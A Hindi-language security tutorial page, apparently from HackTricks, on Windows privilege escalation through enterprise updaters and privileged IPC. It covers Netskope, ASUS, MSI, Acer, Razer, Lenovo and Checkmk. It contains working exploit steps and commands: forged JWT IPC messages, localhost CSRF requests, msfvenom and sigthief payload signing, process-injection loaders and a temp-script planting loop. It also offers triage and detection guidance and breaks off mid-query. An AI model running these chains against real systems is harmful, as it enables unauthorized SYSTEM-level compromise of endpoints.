# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows local privilege escalation chains की एक श्रेणी का सामान्यीकृत विवरण देता है। ये chains enterprise endpoint agents और updaters में पाई गई हैं, जहाँ कम बाधाओं वाला IPC surface और privileged update flow मौजूद होता है। इसका एक प्रतिनिधि उदाहरण Windows के लिए Netskope Client < R129 (CVE-2025-0309) है। इसमें कम privilege वाला user, attacker-controlled server के ज़रिए enrollment करवाने के लिए मजबूर कर सकता है और फिर malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

इसी तरह के products पर दोबारा इस्तेमाल किए जा सकने वाले मुख्य विचार:
- Privileged service के localhost IPC का दुरुपयोग करके उसे attacker server पर re-enrollment या reconfiguration के लिए मजबूर करें।
- Vendor के update endpoints लागू करें, rogue Trusted Root CA भेजें और updater को malicious, “signed” package की ओर निर्देशित करें।
- कमज़ोर signer checks (CN allow-lists), optional digest flags और ढीली MSI properties को बायपास करें।
- अगर IPC “encrypted” है, तो registry में stored, सभी के लिए पढ़ने योग्य machine identifiers से key/IV प्राप्त करें।
- यदि service callers को image path/process name के आधार पर सीमित करती है, तो allow-listed process में inject करें या किसी process को suspended अवस्था में शुरू करके minimal thread-context patch के ज़रिए अपनी DLL को bootstrap करें।

Custom local TCP services की identity और input boundaries की भी उतनी ही सावधानी से समीक्षा करें, भले ही उन्हें PIN या किसी अन्य application credential की ज़रूरत हो। Listener को उसके process और effective service account से जोड़ें, फिर exact deployed binary/version देखें और जाँचें कि caller-controlled fields को fixed buffers में copy करने या child-process command बनाने से पहले उनकी length जाँची जाती है या नहीं। [Microsoft की buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) बताती है कि privileged native code में unchecked external input खतरनाक क्यों है। केवल loopback listener, hardcoded credential या process name से memory corruption या SYSTEM execution साबित नहीं होता; reachability, authorization, code path और mitigations अलग-अलग शर्तें हैं। Live service को crash करने वाली लंबाई का input भेजने के बजाय नियमित enumeration को passive रखें।

---
## 1) localhost IPC के ज़रिए enrollment को attacker server पर भेजने के लिए मजबूर करना

कई agents में user-mode UI process होता है, जो localhost TCP पर JSON का उपयोग करके SYSTEM service से बात करता है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token बनाएँ जिसके claims backend host (जैसे AddonUrl) को नियंत्रित करें। alg=None का उपयोग करें, ताकि signature की ज़रूरत न हो।
2) अपने JWT और tenant name के साथ provisioning command चलाने वाला IPC message भेजें:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service enrollment/config के लिए आपके rogue server को अनुरोध भेजना शुरू कर देती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट:
- यदि caller verification path/name-based है, तो अनुरोध किसी allow-listed vendor binary से भेजें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) SYSTEM के रूप में code चलाने के लिए update channel hijack करना

जब client आपके server से बात करने लगे, तो अपेक्षित endpoints लागू करें और उसे attacker MSI की ओर निर्देशित करें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत कम updater interval वाला JSON config लौटाएँ, जैसे:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate लौटाता है। Service इसे Local Machine Trusted Root store में install करती है।
3) /v2/checkupdate → malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

जंगली परिवेश में आमतौर पर दिखने वाली जाँचों को bypass करना:
- Signer CN allow-list: Service केवल यह जाँच सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA इसी CN वाला leaf जारी करके MSI को sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की एक benign MSI property शामिल करें। Install के समय इसे enforce नहीं किया जाता।
- Optional digest enforcement: config flag (जैसे, check_msi_digest=false) अतिरिक्त cryptographic validation को disable करता है।

नतीजा: SYSTEM service आपकी MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से install करके मनमाना code NT AUTHORITY\SYSTEM के रूप में execute करती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass से सीख: यदि कोई vendor update source को cryptographically authenticate करने के बजाय कुछ “trusted” domains को allow-list करता है, तो vendor के स्वामित्व वाले redirectors या reverse proxies खोजें, जिनसे traffic को अब भी अपनी दिशा में भेजा जा सके। Netskope के मामले में, बाद के सार्वजनिक शोध से पता चला कि R129-era allow-list का दुरुपयोग अब भी `rproxy.goskope.com` के ज़रिए किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। Hostname allow-lists को speed bump समझें, trust boundary नहीं।<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC requests forge करना (जहाँ मौजूद हो)

R127 से, Netskope ने IPC JSON को encryptData field में wrap किया, जो Base64 जैसा दिखता है। Reverse engineering से पता चला कि AES key/IV, registry values से derive होते हैं जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को दोहरा सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> सामान्य सुझाव: यदि कोई agent अचानक अपने IPC को “encrypt” करने लगे, तो HKLM में device IDs, product GUIDs और install IDs को key material के रूप में खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत मौजूद allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने की कोशिश करती हैं।

Bypass के दो व्यावहारिक तरीके:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसके अंदर से IPC proxy करें।
- Allow-listed binary को suspended अवस्था में spawn करें और driver-enforced tamper rules को संतुष्ट करने के लिए CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (§5 देखें)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection के अनुकूल injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से खतरनाक rights हटाने के लिए minifilter/OB callbacks driver (जैसे, Stadrv) के साथ आते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: अधिकारों को THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

इन सीमाओं का पालन करने वाला एक भरोसेमंद user-mode loader:
1) CREATE_SUSPENDED के साथ vendor binary का CreateProcess करें।
2) वे handles प्राप्त करें जिनकी आपको अब भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या यदि आप किसी ज्ञात RIP पर code patch करते हैं, तो केवल THREAD_RESUME)।
3) ntdll!NtContinue (या किसी अन्य शुरुआती, निश्चित रूप से mapped thunk) को एक छोटे stub से overwrite करें, जो आपकी DLL के path पर LoadLibraryW call करे और फिर वापस jump करे।
4) In-process अपने stub को trigger करने और अपनी DLL load करने के लिए ResumeThread करें।

चूँकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे बनाया था), इसलिए driver की policy का पालन होता है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) व्यावहारिक tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing को automate करता है और आवश्यक endpoints serve करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो मनमाने (वैकल्पिक रूप से AES-encrypted) IPC messages बनाता है और allow-listed binary से originate करने के लिए suspended-process injection भी शामिल करता है।<sup>[[4]](#references)</sup>

## 7) अज्ञात updater/IPC surfaces के लिए तेज़ triage workflow

किसी नए endpoint agent या motherboard “helper” suite की जाँच करते समय, एक quick workflow आमतौर पर यह पता लगाने के लिए पर्याप्त होता है कि क्या आप एक संभावित privesc target देख रहे हैं:<sup>[[6]](#references)</sup>

1) Loopback listeners enumerate करें और उन्हें vendor processes से map करें:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) संभावित named pipes की सूची बनाएं:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) plugin-based IPC servers द्वारा इस्तेमाल किए जाने वाले registry-backed routing data को खंगालें:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) पहले user-mode client से endpoint names, JSON keys और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) वास्तविक trust predicate को खोजें, न कि केवल उस code path को जो अंततः process लॉन्च करता है:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

प्राथमिकता देने योग्य पैटर्न:
- `CryptQueryObject`/certificate parsing बिना `WinVerifyTrust` के आमतौर पर इसका मतलब है कि “certificate exists” को “certificate is trusted” मान लिया गया, जिससे certificate cloning या अन्य fake-signer tricks संभव हो जाती हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` अक्सर attacker-controlled lookalike domains के ज़रिए exploit किया जा सकता है।
- अगर low-privileged GUI तय करता है कि “the file is trusted” और SYSTEM broker बस उस नतीजे का उपयोग करता है, तो client-side DLL/JS को patch या reimplement करना अक्सर पूरी boundary को bypass कर देता है (Razer-style split validation)।
- अगर broker payload को `%TEMP%`/`C:\Windows\Temp` में copy करता है और फिर उसी path से उसे validate या schedule करता है, तो तुरंत TOCTOU replacement windows और ऐसे sibling plugin modules की जाँच करें जो कमज़ोर checks वाले alternate `ExecuteTask()` wrappers उपलब्ध कराते हैं।<sup>[[6]](#references)</sup>

Named-pipe-heavy targets के लिए, protocol को गहराई से reverse करने से पहले कमज़ोर DACLs और remotely reachable pipes खोजने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

अगर target callers को सिर्फ PID, image path या process name के आधार पर authenticate करता है, तो इसे boundary के बजाय speed bump मानें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को संतुष्ट करने के लिए पर्याप्त होता है। Named pipes के लिए, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) इस primitive को अधिक विस्तार से समझाता है।

Privileged **cleanup or restore broker** के लिए, pipe ACL के साथ-साथ path trust boundary की भी जाँच करें। कम privileges वाला caller shared directory में restore destination चुनने या staged backup artifact का नाम बदलने में सक्षम हो सकता है, भले ही service executable और उसका install directory सुरक्षित हों। अलग-अलग पुष्टि करें कि caller restore command तक पहुँच सकता है, exact staged input या filename को बदल सकता है, broker higher identity के तहत चलता है, और उसका restore operation वास्तव में चुने गए protected path पर लिखता है। Writable staging directory या readable pipe अकेले arbitrary privileged write साबित नहीं करते; destination mapping और service behavior की code review या controlled testing ज़रूरी है। Passive enumeration के दौरान कोई अज्ञात cleanup command न चलाएँ, क्योंकि वह user files delete कर सकता है।

---
## 8) केवल vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

एक नया variation जिस पर नज़र रखनी चाहिए, वह है **signed-client RPC broker**: low-privileged Lenovo-signed desktop process एक SYSTEM service से बात करता है, और service JSON commands को `%ProgramData%` के अंतर्गत XML-described add-ins के समूह तक पहुँचाती है। किसी भी accepted signed client के **अंदर code execution** हासिल होने के बाद, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर भरोसा करना क्योंकि उस पर vendor के signatures हैं**: researchers ने writable directory में Lenovo-signed EXE copy करके और DLL side-load (`profapi.dll`) को सफल बनाकर authenticated context हासिल किया, जिससे उस client के अंदर arbitrary code चला जो service को पहले से trusted था।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के अंतर्गत घोषित होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests को enumerate करने से अक्सर broker को reverse करने की तुलना में असली privileged verbs जल्दी सामने आते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse, और substring-based registry path checks मिले, जिनसे intended hive के बाहर writes संभव हुए।

Target पर उपयोगी recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Practical takeaway: जब भी कोई helper suite ऐसा broker expose करे जो पहले **caller process** को authenticate करता है और उसके बाद ही दर्जनों plugin/add-in commands को dispatch करता है, तो front-door trust check को bypass करने के बाद रुकें नहीं। Manifest/contract table dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel में अक्सर दूसरे चरण के कई bugs छिपे होते हैं।

---
## 1) Privileged HTTP APIs के विरुद्ध browser-to-localhost CSRF (ASUS DriverHub)

DriverHub एक user-mode HTTP service (ADU.exe) को 127.0.0.1:53000 पर चलाता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करती है। Origin filter, Origin header और `/asus/v1.0/*` से expose किए गए download URLs पर बस `string_contains(".asus.com")` चलाता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसा attacker-controlled host check पास कर लेता है और JavaScript से state-changing requests भेज सकता है।<sup>[[6]](#references)</sup> अन्य bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और वहाँ एक malicious webpage host करें।
2) `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे, `Reboot`, `UpdateApp`) को call करने के लिए `fetch` या XHR का उपयोग करें।
3) Handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS में नीचे दिया गया schema दिखता है।

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

नीचे दिखाया गया PowerShell CLI भी तब सफल होता है, जब Origin header को spoof करके trusted value पर सेट किया जाता है:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

हमलावर की साइट पर किसी भी ब्राउज़र विज़िट से SYSTEM helper चलाने वाला 1-click (या `onload` के ज़रिए 0-click) local CSRF हो सकता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में तय arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation में वही substring logic इस्तेमाल होता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार कर लिया जाता है। Download के बाद, ADU.exe चलाने से पहले केवल यह जाँचता है कि PE में signature मौजूद है और Subject string ASUS से मेल खाती है—`WinVerifyTrust` या chain validation नहीं होती।

इस flow को weaponize करने के लिए:
1) एक payload बनाएँ (जैसे, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) उसमें ASUS का signer clone करें (जैसे, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` जैसे दिखने वाले domain पर host करें और ऊपर दिए गए browser CSRF के ज़रिए UpdateApp trigger करें।

क्योंकि Origin और URL filters दोनों substring-based हैं और signer check केवल strings की तुलना करता है, DriverHub हमलावर की binary डाउनलोड करके अपने elevated context में execute करता है।<sup>[[6]](#references)</sup>

---
## 1) Updater के copy/execute paths के अंदर TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol उपलब्ध कराती है, जिसमें हर frame का format `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) में `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` शामिल है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के ज़रिए signature जाँचता है (certificate subject का “MICRO-STAR INTERNATIONAL CO., LTD.” से मेल खाना और `WinVerifyTrust` का सफल होना ज़रूरी है)।
3) एक scheduled task बनाता है, जो attacker-controlled arguments के साथ temp file को SYSTEM के रूप में चलाता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। हमलावर:
- Frame A भेज सकता है, जिसमें एक वैध MSI-signed binary हो (इससे signature check सफल होता है और task queue हो जाता है)।
- इसके साथ ही बार-बार Frame B messages भेजकर `MSI Center SDK.exe` को verification पूरी होने के ठीक बाद malicious payload से overwrite करने की कोशिश कर सकता है।

Scheduler चलने पर, मूल file को validate किए जाने के बावजूद वह overwritten payload को SYSTEM के रूप में execute करता है। भरोसेमंद exploitation के लिए दो goroutines/threads का इस्तेमाल करके CMD_AutoUpdateSDK को तब तक spam किया जाता है, जब तक TOCTOU window जीत न ली जाए।<sup>[[6]](#references)</sup>

---
## 2) Custom SYSTEM-level IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा लोड किए गए हर plugin/DLL को एक Component ID मिलता है, जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` के अंतर्गत stored होता है। Frame के पहले 4 bytes उस component को चुनते हैं, जिससे हमलावर arbitrary modules को commands भेज सकते हैं।
- Plugins अपने task runners तय कर सकते हैं। `Support\API_Support.dll` में `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` मौजूद है और यह बिना **किसी signature validation के** सीधे `API_Support.EX_Task::ExecuteTask()` call करता है—कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` की ओर point करके निश्चित रूप से SYSTEM execution पा सकता है।
- Wireshark से loopback traffic sniff करने या dnSpy में .NET binaries instrument करने पर Component ↔ command mapping जल्दी पता चल जाती है; इसके बाद custom Go/ Python clients frames replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` उपलब्ध कराता है और इसका discretionary ACL remote clients को भी अनुमति देता है (जैसे, `\\TARGET\pipe\treadstone_service_LightMode`)। File path के साथ command ID `7` भेजने पर service का process-spawning routine चलता है।
- Client library args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` से dynamic instrumentation करने पर (instrumentation के सुझावों के लिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) देखें) पता चलता है कि `CreateProcessAsUser` call करने से पहले native handler इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch चलता है, जो full SYSTEM token बनाए रखता है और high-integrity SID (`S-1-16-12288`) set करता है। इसलिए शुरू की गई binary unrestricted SYSTEM के रूप में चलती है—locally और cross-machine, दोनों जगह।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ इस्तेमाल करके lab VMs पर भी ACC चालू किया जा सकता है और vendor hardware के बिना pipe को आज़माया जा सकता है।<sup>[[6]](#references)</sup>

ये IPC bugs बताते हैं कि localhost services को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू करना क्यों ज़रूरी है, और हर module के “run arbitrary binary” helper में समान signer verifications क्यों होने चाहिए।

---
## 3) कमज़ोर user-mode validation वाले COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस परिवार में एक और उपयोगी pattern जोड़ा: कम privilege वाला user COM helper `RzUtility.Elevator` से process launch करने का अनुरोध कर सकता है, जबकि trust का फ़ैसला privileged boundary के अंदर मज़बूती से लागू करने के बजाय user-mode DLL (`simple_service.dll`) को सौंपा गया है।

देखा गया exploitation path:
- COM object `RzUtility.Elevator` instantiate करें।
- Elevated launch का अनुरोध करने के लिए `LaunchProcessNoWait(<path>, "", 1)` call करें।
- Public PoC में अनुरोध भेजने से पहले `simple_service.dll` के अंदर PE-signature gate patch करके हटा दिया जाता है, जिससे हमलावर की चुनी हुई कोई भी executable launch हो सकती है।<sup>[[6]](#references)[[10]](#references)</sup>

न्यूनतम PowerShell invocation:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

सामान्य निष्कर्ष: “helper” suites को reverse करते समय केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater` या `Utility` जैसे नामों वाली COM classes देखें, फिर जाँचें कि privileged service target binary को स्वयं validate करती है या केवल उस नतीजे पर भरोसा करती है जिसकी गणना patchable user-mode client DLL करती है। यह pattern Razer तक सीमित नहीं है: ऐसा कोई भी split design, जिसमें high-privilege broker low-privilege side से मिले allow/deny निर्णय का उपयोग करता है, privesc की संभावित सतह है।


---
## MSI repair के दौरान predictable temp script execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अब भी privileged actions इस तरह लागू करते हैं कि `C:\Windows\Temp` में एक temporary `.cmd` लिखते हैं और उसे `SYSTEM` के रूप में execute करते हैं। अगर filename predictable हो और service पहले से मौजूद files को सुरक्षित तरीके से दोबारा न बनाए, तो low-privileged user भविष्य की temp file को **read-only** के रूप में पहले से बना सकता है। इससे privileged process अपनी script के बजाय attacker-controlled content execute कर सकती है।

Vulnerable Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- प्रभावित branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

व्यावहारिक workflow:
1. मौजूदा process IDs या running agent PID से एक यथार्थवादी PID range का अनुमान लगाएँ।
2. एक छोटा **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. संभावित range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` फैलाएँ और हर file को read-only के रूप में mark करें।
4. cached MSI का repair trigger करें, ताकि privileged service temp script को फिर से बनाने का प्रयास करे और उसके बाद उसे execute करे।<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

यदि vulnerable product Windows Installer के साथ इंस्टॉल किया गया है, तो repair शुरू करने से पहले `C:\Windows\Installer` के अंतर्गत मौजूद बेतरतीब नाम वाली cached MSI को उसके product name से मिलाएँ:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

ऑपरेशनल नोट्स:
- `qwinsta` तब उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि कोई मौजूदा desktop/disconnected session repair को सही ढंग से ट्रिगर कर सकता है या नहीं।<sup>[[7]](#references)</sup>
- यह पैटर्न अन्य endpoint agents और updaters पर भी लागू होता है, जो **world-writable locations में temp scripts रखते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। अनुमानित नामों, exclusive create semantics की कमी, और ऐसे repair/update flows की जाँच करें जिन्हें मांग पर ट्रिगर किया जा सके।

### Interactive installer repair और privileged console

PDF24 Creator 11.15.1 एक अलग MSI-repair जोखिम दिखाता है: इसका printer-install custom action repair के दौरान SYSTEM rights के साथ एक दिखाई देने वाला console शुरू कर सकता है। Vendor ने इस व्यवहार को ठीक करने के लिए 11.15.2 में MSI installer बदला। किसी पुराने product version को केवल triage lead मानें। जाँचें कि MSI package registered या reachable है या नहीं, क्या यह user repair शुरू कर सकता है, क्या vulnerable custom action और log-file delay मौजूद हैं, और क्या interactive desktop console को दिखा सकता है। रिपोर्ट की गई delay में `faxPrnInst.log` पर oplock का उपयोग किया गया था; केवल file writability ही एकमात्र access condition नहीं है। Non-interactive shell, inaccessible package, या patched installer इस chain को तोड़ सकते हैं। यह issue `AlwaysInstallElevated` पर निर्भर नहीं करता और अनुमानित temporary script को replace करने से अलग है।

---
## कमजोर updater validation के ज़रिए remote supply-chain hijack (WinGUp / Notepad++)

जून 2025 और दिसंबर 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure को compromise करने वाले attackers ने चुने हुए victims को चुनिंदा रूप से malicious manifests दिए। पुराने WinGUp-आधारित updaters update की authenticity को पूरी तरह verify नहीं करते थे, इसलिए एक hostile XML response clients को attacker-controlled URLs पर redirect कर सकता था। चूँकि client ने downloaded installer पर trusted certificate chain और valid PE signature—दोनों लागू किए बिना HTTPS content स्वीकार किया, victims ने trojanized NSIS `update.exe` fetch और execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting को compromise करें और update checks के जवाब में malicious download URL की ओर संकेत करने वाला attacker metadata दें।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **अपनी signed binary लाएँ + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में malicious `log.dll` डालें। Signed binary चलने पर Windows, `log.dll` को sideload करता है; यह DLL Chrysalis backdoor को decrypt करके reflectively load करता है (static detection को कठिन बनाने के लिए Warbird-protected + API hashing का उपयोग करके)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे, `EnumWindowStationsW`) का उपयोग करता है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए hardening/detection से जुड़ी सीख:
- Downloaded installer की **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest पर भी हस्ताक्षर करें (जैसे, XMLDSig)। Validation के बिना manifest-controlled redirects को block करें।
- **BYO signed binary sideloading** को post-download detection pivot मानें: जब signed vendor EXE अपने canonical install path के बाहर के किसी DLL नाम को load करे (जैसे, Bitdefender का Temp/Downloads से `log.dll` load करना), और जब कोई updater temp से non-vendor signatures वाले installers डाले/execute करे, तो alert करें।
- इस chain में देखे गए **malware-specific artifacts** की निगरानी करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में `gup.exe` द्वारा असामान्य writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और उसके बाद के versions में WinGUp को मजबूत किया: अब लौटाए गए XML पर हस्ताक्षर किए जाते हैं (XMLDSig), और नए builds केवल transport पर भरोसा करने के बजाय downloaded installer की certificate + signature verification लागू करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
